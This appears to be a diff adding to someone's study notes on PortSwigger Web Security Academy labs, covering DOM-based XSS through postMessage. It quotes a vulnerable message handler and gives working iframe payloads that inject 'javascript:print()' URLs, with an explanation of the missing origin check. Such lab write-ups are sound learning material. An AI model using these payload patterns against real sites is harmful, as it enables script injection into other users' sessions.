@@ -30,3 +30,33 @@
 
 ```
 - I struggled with constructing the payload here. I knew it needed to have `https:` or `http:`, and I knew it was a JavaScript URL. I attempted `<iframe src="https://0aad00b0039dc1f980ba1c2e003f00ae.web-security-academy.net/" width="2000" height="2000" onload="this.contentWindow.postMessage('javascript:print(); http:','*')">` thinking the semicolon would terminate it, but I wasn't really considering the rest of the message - the http:. What I needed to do instead was comment out the rest with JavaScript comment, `//`, to prevent a syntax error or whatever that was causing the failure on my origina attempt ... so the final payload is `<iframe src="https://0aad00b0039dc1f980ba1c2e003f00ae.web-security-academy.net/" width="2000" height="2000" onload="this.contentWindow.postMessage('javascript:print()//http:','*')">`.
+
+### DOM XSS Using Web Messages and `JSON.parse`
+```
+
+                        window.addEventListener('message', function(e) {
+                            var iframe = document.createElement('iframe'), ACMEplayer = {element: iframe}, d;
+                            document.body.appendChild(iframe);
+                            try {
+                                d = JSON.parse(e.data);
+                            } catch(e) {
+                                return;
+                            }
+                            switch(d.type) {
+                                case "page-load":
+                                    ACMEplayer.element.scrollIntoView();
+                                    break;
+                                case "load-channel":
+                                    ACMEplayer.element.src = d.url;
+                                    break;
+                                case "player-height-changed":
+                                    ACMEplayer.element.style.width = d.width + "px";
+                                    ACMEplayer.element.style.height = d.height + "px";
+                                    break;
+                            }
+                        }, false);
+```
+- The final payload was `<iframe src=https://0a83008804269a0380e017cb00670089.web-security-academy.net/ onload='this.contentWindow.postMessage("{\"type\":\"load-channel\",\"url\":\"javascript:print()\"}","*")'>`. What did I learn? You need to backslash quotation marks for JSON, `\"`. I reviewed the code, and I noted that `d.url` could be provided as the JavaScript URL from the previous lab. I can see the cases to assist with the JSON keys...
+- When the constructed iframe loads, the postMessage() method sends a web message to the home page with the type load-channel. The even listener receives the message and parses it with JSON.parse() before sending it to the switch.
+- The switch triggers load-channel case, which assigns the url property of the message to the src attribute of the ACMEplayer.element iframe. However, in our case, the url property of the message was actually a JavaScript payload. 
+- **Why does this happen?** The event handler does not contain any form of origin check and the second argument specifics that any targetOrigin is allowed for the web message. 
